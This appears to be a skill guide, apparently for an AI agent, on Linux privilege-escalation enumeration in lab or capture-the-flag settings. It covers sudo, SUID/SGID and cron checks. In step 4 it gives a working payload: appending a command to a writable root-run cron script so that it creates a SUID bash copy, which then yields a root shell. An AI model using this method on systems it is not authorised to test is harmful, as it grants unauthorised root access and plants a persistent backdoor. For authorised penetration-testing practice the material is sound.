# Skill: Linux Privilege Escalation Enumeration

## When to use this

As soon as you have *any* shell on a Linux box, before trying to do
anything else. Don't try to escalate privileges blindly — enumerate
first, every time.

## The core technique — a standard enumeration checklist

Run these, in roughly this order, and actually read every line of
output rather than skimming for something that looks dramatic:

1. **Who am I, and what can I already do?**
   ```
   id
   whoami
   sudo -n -l          # non-interactive check -- won't hang waiting for a password
   ```
   If `sudo -l` lists a command you can run as another user/root with
   `NOPASSWD`, that's very likely the intended path on its own — stop
   and investigate that command specifically before looking further.

2. **What files run with elevated privilege, and are any of them
   writable by you?**
   ```
   find / -perm -4000 -type f 2>/dev/null   # SUID binaries
   find / -perm -2000 -type f 2>/dev/null   # SGID binaries
   ```
   An unusual or custom-looking SUID binary (not a standard system
   tool) is worth deep inspection.

3. **What runs automatically as a more-privileged user, and can you
   influence what it runs?** This is one of the most common real
   privilege-escalation patterns — a scheduled job that executes a
   script, where the *script* (not the scheduler definition itself)
   is writable by your account or group:
   ```
   ls -la /etc/cron.d/
   cat /etc/cron.d/<anything-unusual>
   crontab -l                    # your own crontab
   sudo crontab -l 2>/dev/null   # root's, if you can read it
   ```
   For each cron entry you find, check the permissions on the *actual
   script file* it executes, not just the cron definition:
   ```
   ls -la <path/to/script/the/cron/job/runs>
   ```
   If that script's owner is root but its permissions let your
   current user or group **write** to it, you can get code executed
   as whoever owns the cron job (usually root) by appending a command
   and waiting for the next scheduled run (cron jobs are commonly
   every-minute — check the schedule in the cron file itself, it's
   the first five fields).

4. **If you find a writable root-run script, what should you put in
   it?** A simple, verifiable way to prove and then use the
   escalation is to have it create a SUID copy of a shell:
   ```
   echo 'cp /bin/bash /tmp/<name> && chmod 4755 /tmp/<name>' >> <writable-script>
   # wait for the schedule to fire (check the cron timing you found)
   /tmp/<name> -p -c 'id'     # -p preserves privilege; confirm euid=0
   ```
   Once confirmed, you have a real root shell: `/tmp/<name> -p`.

5. **Clean up after yourself if you're testing responsibly** — a SUID
   shell left lying around is a real security problem on any system
   that isn't yours to leave in that state; remove it when you're
   done verifying, and consider restoring any file you modified to
   its original content/permissions.

## What NOT to do

- Don't try random public privilege-escalation exploits (kernel
  CVEs, etc.) before completing the basic enumeration above — a
  deliberately-built lab almost always has exactly one intended,
  discoverable weakness, not an unpatched kernel bug.
- Don't assume you need `sudo` rights to escalate — a well-designed
  lab may give you none at all and rely entirely on a
  writable-file-run-by-a-privileged-scheduler pattern instead.
- Don't skip confirming identity (`id`) after the escalation — "it
  probably worked" is not the same as verifying `euid=0`.
